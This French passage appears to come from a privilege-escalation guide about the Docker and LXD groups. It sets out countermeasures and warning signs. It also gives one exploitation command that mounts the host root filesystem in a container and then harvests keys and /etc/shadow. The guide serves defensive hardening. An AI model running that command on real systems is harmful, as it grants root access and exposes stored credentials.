## 3) Exploitation rapide (Docker)
- Si membre du groupe `docker` : lancer un conteneur avec volume du host :
  `docker run -v /:/mnt --rm -it ubuntu /bin/bash`  
- Puis explorer `/mnt` pour récupérer clefs, `/etc/shadow`, etc.

## 4) Bonnes pratiques & contremesures
- Ne jamais ajouter d’utilisateurs non fiables aux groupes `lxd`/`docker`.
- Restreindre accès LXD : activer socket TLS + contrôle d’accès.
- Désactiver `security.privileged` par défaut ; utiliser profiles restreints.
- Sur Docker, limiter capacités, désactiver montage de volumes sensibles, utiliser seccomp et AppArmor.
- Auditer images/templates locales (pas d’images non signées).
- Surveillance/logging des créations d’images/containers.

## 5) Signes d’alerte à surveiller
- Existence d’images locales non officielles (`lxc image list`, `docker images`).
- Fichiers template avec mots de passe ou ssh keys dans `~/ContainerImages` ou dossiers partagés.
- Groupes `lxd` / `docker` dans `/etc/group`.

---























